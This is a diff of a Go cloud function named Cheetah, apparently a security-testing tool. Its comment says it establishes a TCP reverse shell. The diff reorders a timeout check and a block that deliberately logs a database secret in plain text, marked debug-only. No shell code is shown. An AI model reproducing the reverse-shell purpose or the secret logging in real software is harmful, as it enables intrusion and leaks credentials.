@@ -36,22 +36,23 @@ func respondWithError(w http.ResponseWriter, errMsg string, statusCode int) {
 
 // Cheetah establishes a TCP reverse shell connection.
 func Cheetah(w http.ResponseWriter, r *http.Request) {
-	timeout, err := strconv.ParseUint(os.Getenv("X_GOOGLE_FUNCTION_TIMEOUT_SEC"), 10, 64)
-
 	//Audit logging
 	writeLog(1, "Startup: The Cheetah is running.")
 
-	//Read basic secret to produce normal audit log activity
-	secret := getSecret("cheetah-database-pass")
-	//NOTE: DON'T DO THIS IN REAL LIFE. BAD IDEA TO LOG SECRETS
-	//DEBUG ONLY: Make sure it found the value
-	writeLog(8, fmt.Sprintf("Secret value: %s", secret))
+	//Grab the function timeout
+	timeout, err := strconv.ParseUint(os.Getenv("X_GOOGLE_FUNCTION_TIMEOUT_SEC"), 10, 64)
 
 	if err != nil {
 		writeLog(2, "Invalid request: Failed to parse function timeout.")
 		respondWithError(w, err.Error(), 500)
 		return
 	}
+
+	//Read basic secret to produce normal audit log activity
+	secret := getSecret("cheetah-database-pass")
+	//NOTE: DON'T DO THIS IN REAL LIFE. BAD IDEA TO LOG SECRETS
+	//DEBUG ONLY: Make sure it found the value
+	writeLog(8, fmt.Sprintf("Secret value: %s", secret))
 
 	// For some reason, a timeout doesn't send a response. Force a response by exiting the process.
 	time.AfterFunc(time.Duration(timeout)*time.Second, func() {
